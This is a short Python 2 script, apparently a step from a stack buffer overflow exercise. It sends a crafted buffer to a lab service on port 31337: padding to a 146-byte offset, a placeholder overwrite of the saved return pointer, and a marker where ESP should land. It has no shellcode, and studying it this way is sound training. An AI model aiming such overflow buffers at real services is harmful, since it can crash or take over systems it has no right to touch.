#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "192.168.80.134"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a happy little message followed by a newline
buffer_length=1024
srp_offset=146

buf = ""
buf += "A"*(srp_offset - len(buf))	# padding
buf += "BBBB"				# SRP overwrite
buf += "CCCC"				# ESP should end up pointing here
buf += "D"*(buffer_length - len(buf))	# Training padding
buf += "\n"

# send the happy little message down the socket
s.send(buf)

# print out what we sent
print("Sent: {0}".format(buf))

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print("Received: {0}".format(data))
